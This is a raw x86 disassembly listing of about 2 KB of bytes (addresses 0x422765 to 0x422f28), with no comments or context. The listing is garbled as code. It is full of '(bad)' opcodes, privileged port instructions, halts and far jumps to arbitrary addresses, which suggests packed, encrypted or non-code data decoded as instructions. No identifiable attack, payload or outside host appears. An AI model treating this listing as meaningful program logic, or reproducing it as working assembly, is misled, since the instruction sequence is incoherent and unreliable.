  422765:	bound  esp,QWORD PTR [eax-0x5f]
  422768:	(bad)
  42276c:	cs in  eax,dx
  42276e:	retf   
  42276f:	loop   0x4226f7
  422771:	mov    esi,0x4aa71ddb
  422776:	fidiv  WORD PTR [bp+si]
  422779:	lods   al,BYTE PTR ds:[esi]
  42277a:	cmp    esp,DWORD PTR ds:0x4614457
  422780:	pop    edi
  422781:	adc    DWORD PTR [ebx],edx
  422783:	ficom  WORD PTR [esi+0x65]
  422786:	imul   eax,eax,0x6268bb8
  42278c:	stos   DWORD PTR es:[edi],eax
  42278d:	fdivr  st,st(0)
  42278f:	mov    eax,0xb3ad4588
  422794:	xor    ah,BYTE PTR [edx]
  422796:	data16 add al,0x53
  422799:	test   al,0x10
  42279b:	repnz pop ebp
  42279d:	clc    
  42279e:	sub    edi,edi
  4227a0:	pop    ebx
  4227a1:	adc    DWORD PTR [edx],esi
  4227a3:	popf   
  4227a4:	clc    
  4227a5:	leave  
  4227a6:	nop
  4227a7:	cmp    DWORD PTR ds:[edi-0x29],ebp
  4227ab:	push   es
  4227ac:	jbe    0x4227ab
  4227ae:	scas   al,BYTE PTR es:[edi]
  4227af:	adc    eax,DWORD PTR [ebp-0x39296aef]
  4227b5:	int    0x8d
  4227b7:	mov    ecx,0x3bf4b4c6
  4227bc:	or     eax,0xaaf347a2
  4227c1:	out    0x37,al
  4227c3:	aas    
  4227c4:	int    0xbc
  4227c6:	sub    bh,BYTE PTR [eax+0x74]
  4227c9:	pop    ebx
  4227ca:	dec    ecx
  4227cb:	bnd jbe 0x422810
  4227ce:	fwait
  4227cf:	cmp    al,0x5e
  4227d1:	dec    edx
  4227d2:	lods   al,BYTE PTR ds:[esi]
  4227d3:	pop    edx
  4227d4:	sbb    DWORD PTR [eax-0x29],ebx
  4227d7:	xchg   esp,eax
  4227d8:	pusha  
  4227d9:	mov    al,0x8
  4227db:	add    esp,esp
  4227dd:	mov    bl,0x65
  4227df:	retf   
  4227e0:	sub    al,0xf2
  4227e2:	add    edi,DWORD PTR [edi+0x12d50f56]
  4227e8:	cs push edx
  4227ea:	clc    
  4227eb:	test   DWORD PTR [ebx-0x6c97d27],eax
  4227f1:	or     ah,dh
  4227f3:	xor    cl,ah
  4227f5:	ret    
  4227f6:	sbb    BYTE PTR [edx+eax*1+0x740cfcf9],bl
  4227fd:	xchg   esp,eax
  4227fe:	mov    dl,0xa8
  422800:	inc    edi
  422801:	fadd   QWORD PTR [eax]
  422803:	das    
  422804:	test   ah,dh
  422806:	pop    ss
  422807:	sub    BYTE PTR [ecx],0x5b
  42280a:	scas   eax,DWORD PTR es:[edi]
  42280b:	popf   
  42280c:	push   ss
  42280d:	or     ebx,esp
  42280f:	ret    
  422810:	pop    esi
  422811:	repz push ds
  422813:	data16 (bad) 
  422815:	ins    BYTE PTR es:[edi],dx
  422816:	fcmovu st,st(1)
  422818:	bound  esp,QWORD PTR [eax]
  42281a:	push   0x907843bd
  42281f:	pop    esi
  422820:	in     al,dx
  422821:	loopne 0x422815
  422823:	push   edi
  422824:	sub    al,0x30
  422826:	pop    ebx
  422827:	adc    cl,BYTE PTR [edx-0x7359dbcb]
  42282d:	add    eax,0x971e9816
  422832:	or     ebx,esp
  422834:	push   cs
  422835:	daa    
  422836:	arpl   WORD PTR [edi+ebp*2-0x39],bx
  42283a:	in     eax,dx
  42283b:	cmp    edi,DWORD PTR [ebx-0x73]
  42283e:	out    dx,eax
  42283f:	lds    ecx,FWORD PTR ds:0x58513fd9
  422845:	aam    0xe7
  422847:	(bad)  ds:0x4452ec6a
  42284d:	xor    eax,esp
  42284f:	add    ecx,DWORD PTR [esi+0x69]
  422852:	xchg   DWORD PTR [eax],edi
  422854:	fwait
  422855:	sar    DWORD PTR ds:0x634e528f,0x6a
  42285c:	mov    ds:0xa7c80239,al
  422861:	gs leave 
  422863:	test   dl,0x31
  422866:	nop
  422867:	lock or al,0xd
  42286a:	sub    ebx,DWORD PTR [esi+eiz*1+0x5257dafb]
  422871:	xchg   edx,eax
  422872:	push   ebp
  422873:	adc    al,0xe4
  422875:	inc    edx
  422876:	mov    ebp,?
  422878:	enter  0xc80c,0xea
  42287c:	mov    esi,0x3c4454d0
  422881:	in     al,dx
  422882:	jae    0x422851
  422884:	hlt    
  422885:	call   0x19ec:0x6d0495a2
  42288c:	cmp    al,0x91
  42288e:	aas    
  42288f:	loop   0x42282d
  422891:	aas    
  422892:	fdiv   DWORD PTR [eax+ebx*4-0x2444bab4]
  422899:	aaa    
  42289a:	aad    0x5d
  42289c:	pusha  
  42289d:	inc    ecx
  42289e:	mov    al,ds:0xbfa979b5
  4228a3:	pop    ss
  4228a4:	dec    edx
  4228a5:	push   ds
  4228a6:	imul   BYTE PTR [edx-0x3c237230]
  4228ac:	(bad)  
  4228ad:	push   edx
  4228ae:	jle    0x4228b6
  4228b0:	hlt    
  4228b1:	mov    fs,WORD PTR [edx-0x7025b7c4]
  4228b7:	sub    eax,edi
  4228b9:	jbe    0x422939
  4228bb:	cmp    esp,DWORD PTR [eax+0xb]
  4228be:	ret    0xbc3d
  4228c1:	xor    cl,BYTE PTR ds:0xb880b5ef
  4228c7:	rdseed esp
  4228ca:	aaa    
  4228cb:	repnz mov esp,0x21dabed6
  4228d1:	or     eax,0xa0d8
  4228d6:	inc    BYTE PTR [esi-0x47c8d507]
  4228dc:	pop    ds
  4228dd:	inc    eax
  4228de:	cmp    esi,DWORD PTR [eax]
  4228e0:	fldenv [ebx-0x4c]
  4228e3:	bound  esp,QWORD PTR [edi-0x59]
  4228e6:	lea    ebx,[esi+0x79]
  4228e9:	int    0x2e
  4228eb:	dec    eax
  4228ec:	std    
  4228ed:	and    al,0xff
  4228ef:	sar    esp,cl
  4228f1:	push   0xffffffb1
  4228f3:	cmp    esp,DWORD PTR [eax-0x22]
  4228f6:	jmp    0x998fab2e
  4228fb:	in     al,0x53
  4228fd:	ins    BYTE PTR es:[edi],dx
  4228fe:	dec    ecx
  4228ff:	test   dl,ch
  422901:	mov    dh,0x56
  422903:	clc    
  422904:	popf   
  422905:	or     BYTE PTR [eax],cl
  422907:	push   cs
  422908:	test   eax,0x1629ef6d
  42290d:	loop   0x42291e
  42290f:	hlt    
  422910:	sbb    ch,al
  422912:	clc    
  422913:	fmul   QWORD PTR [edi+esi*1-0x58]
  422917:	aaa    
  422918:	mov    ecx,0x39501144
  42291d:	adc    esi,edx
  42291f:	sbb    al,0xc6
  422921:	mov    esi,DWORD PTR [edx+0x2b9ade0]
  422927:	in     al,0x53
  422929:	sahf   
  42292a:	in     al,0xda
  42292c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42292d:	sub    eax,0x679052d1
  422932:	jmp    0x597948ab
  422937:	fnstsw WORD PTR [esi]
  422939:	push   edx
  42293a:	jecxz  0x422986
  42293c:	sbb    cl,cl
  42293e:	jge    0x4228e0
  422940:	inc    ecx
  422941:	and    al,0x85
  422943:	ss cmp edi,edi
  422946:	or     DWORD PTR [eax+ecx*4-0x43566827],edx
  42294d:	bound  eax,QWORD PTR [edi-0x28]
  422950:	push   ebp
  422951:	sahf   
  422952:	xchg   esp,eax
  422953:	frstor [esi]
  422955:	jmp    edi
  422957:	fwait
  422958:	add    BYTE PTR [ebx+0x341a6e88],dl
  42295e:	outs   dx,BYTE PTR ds:[esi]
  42295f:	popa   
  422960:	shl    BYTE PTR ds:[ecx+0x54],1
  422964:	dec    edi
  422965:	mov    edi,0x7ef47dbe
  42296a:	push   es
  42296b:	mov    al,dl
  42296d:	sbb    BYTE PTR [edx+0x71],bl
  422970:	fidiv  WORD PTR [esi-0x2b]
  422973:	jecxz  0x422918
  422975:	fistp  QWORD PTR [edx+0x0]
  422978:	and    al,0x91
  42297a:	push   ebx
  42297b:	shl    BYTE PTR [ebp-0x10],0xa5
  42297f:	popa   
  422980:	dec    ebp
  422981:	aam    0x22
  422983:	scas   eax,DWORD PTR es:[edi]
  422984:	ret    
  422985:	fisttp QWORD PTR [edi-0x36307ae8]
  42298b:	icebp  
  42298c:	sub    eax,0xf034747e
  422991:	xchg   DWORD PTR [eax-0x37364d36],ecx
  422997:	jbe    0x422997
  422999:	sub    esp,edx
  42299b:	mov    ecx,0xf3e7e1e7
  4229a0:	xor    DWORD PTR [ecx-0x70f28697],edx
  4229a6:	sbb    bh,BYTE PTR [eax]
  4229a8:	mov    edx,0x863020a
  4229ad:	aam    0xcc
  4229af:	mov    ebx,0x9d676d01
  4229b4:	repz adc ebp,DWORD PTR [esi+edx*4]
  4229b8:	nop
  4229b9:	repz data16 sub al,0x8d
  4229bd:	rol    ecx,1
  4229bf:	dec    ecx
  4229c0:	ins    DWORD PTR es:[edi],dx
  4229c1:	rcl    DWORD PTR [ebx-0x36],cl
  4229c4:	fs (bad) 
  4229c6:	jnp    0x42295c
  4229c8:	push   ds
  4229c9:	push   ss
  4229ca:	les    edi,FWORD PTR [eax-0x102499ae]
  4229d0:	outs   dx,DWORD PTR ds:[esi]
  4229d1:	ja     0x422977
  4229d3:	aas    
  4229d4:	mov    ah,0xbb
  4229d6:	not    cl
  4229d8:	test   ch,dh
  4229da:	sti    
  4229db:	adc    eax,0x7af6f219
  4229e0:	scas   al,BYTE PTR es:[edi]
  4229e1:	mov    bl,0x9c
  4229e3:	cld    
  4229e4:	inc    ebp
  4229e5:	leave  
  4229e6:	push   esp
  4229e7:	call   0x683:0x7560a295
  4229ee:	faddp  st(6),st
  4229f0:	xchg   edi,esp
  4229f2:	push   cs
  4229f3:	or     BYTE PTR [ecx-0x68acedc1],0xce
  4229fa:	(bad)  
  4229fb:	idiv   DWORD PTR [ebx+esi*1-0x6c1cd137]
  422a02:	jge    0x4229b8
  422a04:	lds    esp,FWORD PTR [edi-0x1e]
  422a07:	pusha  
  422a08:	pop    esi
  422a09:	jge    0x422a82
  422a0b:	pop    esp
  422a0c:	sbb    al,0x9d
  422a0e:	add    esp,DWORD PTR [edx+ebx*2]
  422a11:	jne    0x4229bc
  422a13:	std    
  422a14:	cld    
  422a15:	xchg   esp,eax
  422a16:	hlt    
  422a17:	sbb    ebx,DWORD PTR [edi+ecx*2-0x64862f43]
  422a1e:	pop    ebp
  422a1f:	sbb    DWORD PTR [ebx],ebx
  422a21:	sbb    al,0x26
  422a23:	jge    0x4229e2
  422a25:	mov    ecx,ecx
  422a27:	(bad)  
  422a28:	inc    esi
  422a29:	push   ecx
  422a2a:	inc    edx
  422a2b:	gs xchg bl,dh
  422a2e:	push   cs
  422a2f:	cmp    DWORD PTR [ebx-0x51a37006],ecx
  422a35:	cmp    eax,0xf1e47e24
  422a3a:	pop    ebp
  422a3b:	fwait
  422a3c:	stos   DWORD PTR es:[edi],eax
  422a3d:	sbb    al,0x5f
  422a3f:	in     al,0xf9
  422a41:	and    BYTE PTR [eax-0x12f6986a],bh
  422a47:	sub    dl,BYTE PTR [eax+0x1350875b]
  422a4d:	lgs    esp,FWORD PTR [eax+0x7ab21061]
  422a54:	sbb    edi,DWORD PTR [esi-0x3]
  422a57:	or     eax,DWORD PTR [ebx-0x74]
  422a5a:	jmp    0x8da58a88
  422a5f:	lock dec edx
  422a61:	push   esi
  422a62:	sub    DWORD PTR [edx+0x46],esp
  422a65:	mov    al,0x73
  422a67:	jo     0x422a9d
  422a69:	mov    edi,0x267ae5b7
  422a6e:	mov    WORD PTR es:[esi+eax*8-0x1d],fs
  422a73:	mov    dl,0x7
  422a75:	sub    ah,BYTE PTR fs:[ebx]
  422a78:	mov    cl,0x56
  422a7a:	ja     0x422a64
  422a7c:	stc    
  422a7d:	test   DWORD PTR [esp+ecx*8+0x9cc517c],ebx
  422a84:	adc    ah,BYTE PTR [ebx-0x402b7062]
  422a8a:	pop    es
  422a8b:	jmp    0xbf9c6101
  422a90:	out    dx,al
  422a91:	pop    edi
  422a92:	dec    esi
  422a93:	adc    eax,0xceb79a41
  422a98:	pushf  
  422a99:	sahf   
  422a9a:	sbb    ebx,DWORD PTR [eax]
  422a9c:	in     al,0x36
  422a9e:	setge  BYTE PTR [eax+0x3a]
  422aa2:	sbb    eax,0xe32a7f6e
  422aa7:	fsub   DWORD PTR [edi-0x38c8e808]
  422aad:	mov    eax,0x1be145f5
  422ab2:	pusha  
  422ab3:	cli    
  422ab4:	push   esp
  422ab5:	mov    ecx,DWORD PTR [ebp+0x7a832357]
  422abb:	and    eax,0x69ba4c8
  422ac0:	and    cl,bh
  422ac2:	out    dx,al
  422ac3:	jo     0x422a87
  422ac5:	aas    
  422ac6:	aam    0xc2
  422ac8:	stc    
  422ac9:	test   BYTE PTR [edx+eiz*4-0x32b28df9],dh
  422ad0:	test   BYTE PTR cs:[ecx+0x22c7e3a1],0x34
  422ad8:	adc    dh,BYTE PTR [esi+eiz*8]
  422adb:	(bad)  
  422adc:	xor    eax,0x567e52f3
  422ae1:	rcr    edx,cl
  422ae3:	cmc    
  422ae4:	and    BYTE PTR [ecx-0x18],cl
  422ae7:	adc    WORD PTR [ecx+0x2c],ax
  422aeb:	jne    0x422a90
  422aed:	xchg   esp,eax
  422aee:	and    al,0x5d
  422af0:	jnp    0x422b27
  422af2:	mov    ecx,0x99ebcf73
  422af7:	xchg   DWORD PTR [eax+0x278237d0],edi
  422afd:	clc    
  422afe:	jmp    0x422b2d
  422b00:	retf   
  422b01:	test   eax,ebx
  422b03:	ror    DWORD PTR [eax],0xf9
  422b06:	mov    esp,0x772688fa
  422b0b:	push   eax
  422b0c:	hlt    
  422b0d:	sti    
  422b0e:	dec    ebx
  422b0f:	int    0xb3
  422b11:	je     0x422af8
  422b13:	mov    bl,0xa3
  422b15:	jne    0x422ab3
  422b17:	add    DWORD PTR [ecx+ebx*8],0x5
  422b1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b1c:	out    0xad,al
  422b1e:	xchg   edi,eax
  422b1f:	fild   WORD PTR [ebx-0x5c]
  422b22:	xor    BYTE PTR [ebx],ah
  422b24:	add    al,0x72
  422b26:	adc    dl,ah
  422b28:	xchg   DWORD PTR [eax-0x737636f0],ecx
  422b2e:	shr    esi,1
  422b30:	ins    BYTE PTR es:[edi],dx
  422b31:	in     al,dx
  422b32:	into   
  422b33:	push   0x6b062074
  422b38:	sbb    BYTE PTR [esp+eiz*8+0x72],bh
  422b3c:	out    dx,eax
  422b3d:	and    DWORD PTR [edx+0x686e0e80],0xffffffdc
  422b44:	(bad)  
  422b45:	ss (bad) 
  422b48:	xchg   esi,eax
  422b49:	dec    eax
  422b4a:	scas   al,BYTE PTR es:[edi]
  422b4b:	nop
  422b4c:	mov    ds:0x8b595bdd,al
  422b51:	arpl   WORD PTR [esi],bp
  422b53:	sbb    BYTE PTR [edi-0x72],0x4d
  422b57:	mov    edx,0x9f983d55
  422b5c:	mov    esi,0x53668026
  422b61:	gs or  al,cl
  422b64:	inc    esp
  422b65:	loopne 0x422b8b
  422b67:	jbe    0x422b91
  422b69:	push   0xe
  422b6b:	xchg   edx,eax
  422b6c:	sub    dl,BYTE PTR [esi]
  422b6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b6f:	cmp    BYTE PTR [eax-0x46],dh
  422b72:	jecxz  0x422b87
  422b74:	inc    edx
  422b75:	lods   eax,DWORD PTR ds:[esi]
  422b76:	jge    0x422bcd
  422b78:	mov    DWORD PTR [esi+ebx*2],edi
  422b7b:	ret    
  422b7c:	das    
  422b7d:	(bad)  
  422b7e:	call   0x4bbd:0x5dd65c51
  422b85:	adc    eax,0xe35f1398
  422b8a:	cwde   
  422b8b:	fstp   QWORD PTR [esi-0x397ac29a]
  422b91:	jno    0x422b26
  422b93:	inc    edx
  422b94:	imul   esp,DWORD PTR [esi-0x41],0xffffffb6
  422b98:	dec    ebx
  422b99:	rcr    dl,0x63
  422b9c:	ror    DWORD PTR [eax+eax*8],1
  422b9f:	retf   0x2ab9
  422ba2:	mov    esp,0xbbd8d982
  422ba7:	imul   esi,edx,0x12
  422baa:	mov    DWORD PTR [esi+esi*1+0x77],ebx
  422bae:	cmp    DWORD PTR [ecx],esp
  422bb0:	test   DWORD PTR [ecx-0x73],esi
  422bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422bb4:	gs pop ds
  422bb6:	shl    BYTE PTR [edx],cl
  422bb8:	jnp    0x422b43
  422bba:	sbb    ch,bh
  422bbc:	adc    al,0x3f
  422bbe:	lahf   
  422bbf:	add    ecx,DWORD PTR [edi-0x299b7629]
  422bc5:	stos   BYTE PTR es:[edi],al
  422bc6:	les    eax,FWORD PTR [edx]
  422bc8:	cmp    BYTE PTR [ebx],0x39
  422bcb:	xchg   ebx,eax
  422bcc:	loopne 0x422c13
  422bce:	repz (bad) 
  422bd0:	stos   DWORD PTR es:[edi],eax
  422bd1:	mov    ch,0xc4
  422bd3:	xchg   esp,eax
  422bd4:	push   ebp
  422bd5:	jno    0x422bfc
  422bd7:	mov    al,ds:0xa29899f0
  422bdc:	mul    BYTE PTR [edx]
  422bde:	inc    DWORD PTR [edi+edi*1]
  422be1:	jbe    0x422bc3
  422be3:	and    eax,0x9282c795
  422be8:	xor    al,0x40
  422bea:	jle    0x422b86
  422bec:	frstor [ecx-0x53]
  422bef:	fs aas 
  422bf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422bf2:	pop    es
  422bf3:	jne    0x422be6
  422bf5:	cwde   
  422bf6:	data16 (bad) 
  422bf8:	sar    BYTE PTR [ebp+0x42],cl
  422bfb:	in     al,0xc1
  422bfd:	inc    edx
  422bfe:	xchg   DWORD PTR [edi+0x3ffc512c],edx
  422c04:	mov    al,ds:0x7fa061cd
  422c09:	lahf   
  422c0a:	xchg   esp,eax
  422c0b:	add    al,0xe3
  422c0d:	ret    
  422c0e:	jg     0x422c3b
  422c10:	sbb    ebp,ebp
  422c12:	add    ax,0x49dc
  422c16:	mov    esi,0x2297ee9c
  422c1b:	inc    esi
  422c1c:	xchg   esp,eax
  422c1d:	ds enter 0x4cab,0x8c
  422c22:	push   esp
  422c23:	fcom   DWORD PTR [eax]
  422c25:	int3   
  422c26:	mov    eax,0x92e4762f
  422c2b:	adc    al,0x1e
  422c2d:	xor    eax,0x32663ee9
  422c32:	jecxz  0x422c28
  422c34:	mov    bh,0x8e
  422c36:	arpl   dx,ax
  422c38:	inc    ebp
  422c39:	inc    edx
  422c3a:	(bad)  [esi+0x350bafec]
  422c40:	xor    ebp,esp
  422c42:	jecxz  0x422c93
  422c44:	and    al,0xc5
  422c46:	xor    eax,0xcb9001df
  422c4b:	mov    ds:0x5ee8574e,eax
  422c50:	xor    cl,cl
  422c52:	add    eax,0x8b02f572
  422c57:	mul    BYTE PTR [esi]
  422c59:	aas    
  422c5a:	stos   DWORD PTR es:[edi],eax
  422c5b:	mov    DWORD PTR [edx+0x9],edi
  422c5e:	add    cl,dl
  422c60:	int    0xc6
  422c62:	dec    ebx
  422c63:	pop    ebp
  422c64:	ins    BYTE PTR es:[edi],dx
  422c65:	push   esi
  422c66:	data16 jbe 0x422bf4
  422c69:	adc    bl,cl
  422c6b:	cmp    eax,0x44
  422c6e:	inc    esi
  422c6f:	xor    al,0xae
  422c71:	adc    bh,BYTE PTR [edi]
  422c73:	sti    
  422c74:	sbb    ah,0x82
  422c77:	loopne 0x422c08
  422c79:	shl    BYTE PTR [ecx+0x43],cl
  422c7c:	mov    ah,0x73
  422c7e:	lods   eax,DWORD PTR ds:[esi]
  422c7f:	out    dx,al
  422c80:	dec    ebp
  422c81:	mov    ch,dl
  422c83:	inc    eax
  422c84:	xor    bh,BYTE PTR [edx-0x37]
  422c87:	pop    esi
  422c88:	mov    bh,0x88
  422c8a:	out    dx,al
  422c8b:	or     al,cl
  422c8d:	jnp    0x422c1a
  422c8f:	sub    BYTE PTR [edi],cl
  422c91:	or     BYTE PTR [edx],0x75
  422c94:	in     eax,dx
  422c95:	out    dx,eax
  422c96:	dec    ebp
  422c97:	popf   
  422c98:	mov    dl,0x70
  422c9a:	jo     0x422d17
  422c9c:	daa    
  422c9d:	fs sti 
  422c9f:	add    DWORD PTR [ebx-0x3083c273],eax
  422ca5:	sub    ecx,edi
  422ca7:	and    edx,DWORD PTR [esi]
  422ca9:	shl    DWORD PTR [ebx],1
  422cab:	test   al,0x93
  422cad:	mov    eax,ds:0x14d5c82a
  422cb2:	popa   
  422cb3:	dec    eax
  422cb4:	mov    ds:0xec4b5492,al
  422cb9:	hlt    
  422cba:	xchg   ebp,eax
  422cbb:	call   0x51e1e986
  422cc0:	out    dx,al
  422cc1:	add    dh,dl
  422cc3:	dec    eax
  422cc4:	mov    bh,0xfd
  422cc6:	and    cl,BYTE PTR [edi+edi*1-0xc]
  422cca:	mov    BYTE PTR [ebx],al
  422ccc:	sar    BYTE PTR [ebx-0x2a],1
  422ccf:	push   cs
  422cd0:	and    BYTE PTR [ecx+edi*4-0x28],ch
  422cd4:	cld    
  422cd5:	and    BYTE PTR [esi+0x7719bf73],bh
  422cdb:	in     eax,0x52
  422cdd:	cmp    BYTE PTR [ebp+0x40],0x7a
  422ce1:	(bad)  
  422ce2:	test   ebx,0x1ed1a921
  422ce8:	nop
  422ce9:	clc    
  422cea:	mov    ebp,0x9ad0d34a
  422cef:	scas   al,BYTE PTR es:[edi]
  422cf0:	arpl   cx,di
  422cf2:	adc    edi,edx
  422cf4:	sbb    al,0x1a
  422cf6:	inc    ebx
  422cf7:	test   DWORD PTR [ebx+0x321bb101],edi
  422cfd:	lods   eax,DWORD PTR ds:[esi]
  422cfe:	call   0xc3c4:0x40ddf114
  422d05:	aaa    
  422d06:	xor    ebp,DWORD PTR [edi]
  422d08:	xor    al,0xe4
  422d0a:	inc    ebp
  422d0b:	clc    
  422d0c:	push   ss
  422d0d:	and    DWORD PTR [edi+0x19c7a2b1],ebp
  422d13:	mov    bl,0xdc
  422d15:	jge    0x422cb7
  422d17:	gs cs (bad) 
  422d1a:	rcl    DWORD PTR [eax],cl
  422d1c:	xor    ebx,DWORD PTR [ebx+0x3079ed23]
  422d22:	sub    esi,edx
  422d24:	xor    cl,BYTE PTR [ebx+0x7b]
  422d27:	test   DWORD PTR [edi+0x7],esp
  422d2a:	jge    0x422d11
  422d2c:	xchg   esi,eax
  422d2d:	sbb    BYTE PTR [ebx+0x282dda6b],al
  422d33:	mov    cl,0xb8
  422d35:	lock stos DWORD PTR es:[edi],eax
  422d37:	sub    ecx,esp
  422d39:	popa   
  422d3a:	jle    0x422d35
  422d3c:	xor    eax,0x70b9eb6d
  422d41:	rcl    ebp,cl
  422d43:	leave  
  422d44:	sbb    cl,ch
  422d46:	retf   
  422d47:	mov    edx,0x4d6fd830
  422d4c:	hlt    
  422d4d:	pop    esp
  422d4e:	mov    BYTE PTR [esi-0x70],bl
  422d51:	inc    ecx
  422d52:	sub    dl,0x1e
  422d55:	jbe    0x422d80
  422d57:	cmp    BYTE PTR [edx+0x46],bl
  422d5a:	fstp   TBYTE PTR [esi+0x53e3036b]
  422d60:	sbb    BYTE PTR [eax-0x31],bh
  422d63:	push   esi
  422d64:	fs or  eax,0xbb02b883
  422d6a:	dec    esp
  422d6b:	test   cl,0x2a
  422d6e:	add    DWORD PTR [edx+0x24],eax
  422d71:	dec    ebx
  422d72:	add    al,0xb9
  422d74:	xor    eax,0xd588509f
  422d79:	push   0xbb290e1e
  422d7e:	cmp    al,0x3e
  422d80:	pop    ebx
  422d81:	mov    ecx,0x9d19a939
  422d86:	push   esp
  422d87:	call   0xe641a07a
  422d8c:	xor    eax,DWORD PTR [ecx-0x40586cd3]
  422d92:	por    mm4,QWORD PTR [esi+0x24181835]
  422d99:	clc    
  422d9a:	cmp    cl,BYTE PTR [ebx]
  422d9c:	(bad)  
  422d9d:	mov    bl,0xcc
  422d9f:	add    BYTE PTR [edi],al
  422da1:	(bad)  
  422da2:	rol    DWORD PTR [ecx-0x7e0d0e57],1
  422da8:	les    ebx,FWORD PTR [edx-0x787861e8]
  422dae:	dec    edx
  422daf:	xor    bh,cl
  422db1:	pushf  
  422db2:	cmp    bh,dl
  422db4:	in     eax,dx
  422db5:	cmp    eax,0xedfba729
  422dba:	mov    al,0x9d
  422dbc:	mov    bl,0x7f
  422dbe:	mov    eax,ds:0xb8338dc2
  422dc3:	or     BYTE PTR [edx-0x64],ah
  422dc6:	dec    edi
  422dc7:	jle    0x422d5c
  422dc9:	mov    ecx,0x3027624
  422dce:	adc    ch,ch
  422dd0:	push   ebx
  422dd1:	mov    ah,0x63
  422dd3:	leave  
  422dd4:	push   es
  422dd5:	sqrtps xmm4,xmm0
  422dd8:	addr16 (bad) 
  422dda:	push   ecx
  422ddb:	push   ebp
  422ddc:	(bad)  
  422ddd:	add    DWORD PTR [ebp+0x39c730b3],ecx
  422de3:	cmp    al,0xb4
  422de5:	in     al,dx
  422de6:	lods   al,BYTE PTR ds:[esi]
  422de7:	ror    DWORD PTR [esi+0xcabf6c5],1
  422ded:	into   
  422dee:	sbb    edx,DWORD PTR [ebx+0x1c]
  422df1:	mov    cl,0x65
  422df3:	inc    ebp
  422df4:	aam    0xef
  422df6:	dec    edi
  422df7:	ffree  st(2)
  422df9:	mov    al,ds:0x2c9ba16e
  422dfe:	push   cs
  422dff:	jl     0x422da9
  422e01:	pop    esp
  422e02:	mov    ecx,0xc66e467d
  422e07:	cmp    DWORD PTR [edx],esi
  422e09:	inc    ecx
  422e0a:	inc    edi
  422e0b:	sub    DWORD PTR [esi+0x11],edi
  422e0e:	js     0x422df0
  422e10:	lds    ecx,FWORD PTR [ebx+0x2c]
  422e13:	dec    edi
  422e14:	pop    ss
  422e15:	push   0xffffffa8
  422e17:	ja     0x422dcc
  422e19:	leave  
  422e1a:	sbb    ah,BYTE PTR [ebp-0x5f98e333]
  422e20:	(bad)
  422e23:	mov    esi,0xe512a01a
  422e28:	inc    ebx
  422e29:	pop    eax
  422e2a:	out    0xe1,al
  422e2c:	jnp    0x422e42
  422e2e:	pop    edx
  422e2f:	gs xchg edi,eax
  422e31:	dec    edx
  422e32:	bound  ebp,QWORD PTR [edx-0x2c]
  422e35:	enter  0x7f32,0x6e
  422e39:	and    al,0x3
  422e3b:	ds xor edi,edi
  422e3e:	pop    ss
  422e3f:	test   DWORD PTR [esi-0x3a],0xe173ddb1
  422e46:	ret    0x652d
  422e49:	rcl    BYTE PTR [ebx],0x65
  422e4c:	or     eax,0x1d22ad67
  422e51:	ja     0x422dd4
  422e53:	inc    esp
  422e54:	and    ecx,DWORD PTR [edi-0x5cb27bd9]
  422e5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e5b:	arpl   WORD PTR [ebp+0x2fddd4b6],bp
  422e61:	outs   dx,DWORD PTR ds:[esi]
  422e62:	lahf   
  422e63:	jecxz  0x422e98
  422e65:	inc    eax
  422e66:	in     eax,dx
  422e67:	push   es
  422e68:	call   0x8aaf:0xc06d8d91
  422e6f:	fld    DWORD PTR [ebx+0x3c]
  422e72:	mov    ecx,0x35c52780
  422e77:	cmp    ch,BYTE PTR [edi+0x50]
  422e7a:	ins    DWORD PTR es:[edi],dx
  422e7b:	inc    ebp
  422e7c:	inc    esi
  422e7d:	add    eax,0xe2c82bf3
  422e82:	mov    dh,0x22
  422e84:	mov    DWORD PTR [ecx+0x37ae1c34],ecx
  422e8a:	loope  0x422e2a
  422e8c:	pop    ds
  422e8d:	popa   
  422e8e:	enter  0x31aa,0x49
  422e92:	or     al,BYTE PTR [esi]
  422e94:	loopne 0x422e9e
  422e96:	dec    edi
  422e97:	or     al,0xba
  422e99:	xor    bl,dl
  422e9b:	fsubr  DWORD PTR [esi+0x15]
  422e9e:	sbb    al,0x97
  422ea0:	jne    0x422ec6
  422ea2:	ror    bl,1
  422ea4:	fisttp WORD PTR [eax+edi*1-0x672bcfee]
  422eab:	test   eax,0x357763c2
  422eb0:	lods   al,BYTE PTR ds:[esi]
  422eb1:	sbb    al,0x27
  422eb3:	xchg   esi,eax
  422eb4:	stos   BYTE PTR es:[edi],al
  422eb5:	les    edi,FWORD PTR [ebx-0x55]
  422eb8:	aas    
  422eb9:	sti    
  422eba:	enter  0x6287,0x1
  422ebe:	mov    al,0xcb
  422ec0:	loopne 0x422ef3
  422ec2:	fisubr WORD PTR [ebx+0x17]
  422ec5:	dec    ebp
  422ec6:	push   eax
  422ec7:	xchg   esp,eax
  422ec8:	push   es
  422ec9:	fst    DWORD PTR [eax]
  422ecb:	int    0xa0
  422ecd:	inc    eax
  422ece:	repz cmp bh,al
  422ed1:	pop    esp
  422ed2:	gs cwde 
  422ed4:	and    esi,DWORD PTR [eax+0x6c]
  422ed7:	dec    ebp
  422ed8:	mov    ah,0x8d
  422eda:	je     0x422e9a
  422edc:	loop   0x422e82
  422ede:	or     BYTE PTR [ebx-0xe9cb9],cl
  422ee4:	jo     0x422ea0
  422ee6:	xchg   ecx,eax
  422ee7:	sahf   
  422ee8:	aam    0x15
  422eea:	jmp    0x28e8:0xd78f8328
  422ef1:	arpl   WORD PTR [esi+ebx*4-0x45fcb810],bx
  422ef8:	sar    BYTE PTR [esi-0x6],1
  422efb:	or     BYTE PTR [ecx],ch
  422efd:	ja     0x422f50
  422eff:	and    DWORD PTR [ebx],edx
  422f01:	add    al,0x6e
  422f03:	add    eax,eax
  422f05:	pop    ss
  422f06:	gs retf 
  422f08:	imul   eax,DWORD PTR [edx+0x5e],0xe6c14faf
  422f0f:	and    al,0xfa
  422f11:	bound  esp,QWORD PTR [ebx+0x62]
  422f14:	sbb    DWORD PTR [ebp-0x5d54d46d],ebp
  422f1a:	mov    dh,0xd4
  422f1c:	jmp    0x422f1d
  422f1e:	ret    0x53ce
  422f21:	mov    DWORD PTR [ecx+0x255a0aa2],esi
  422f27:	push   ebp
  422f28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
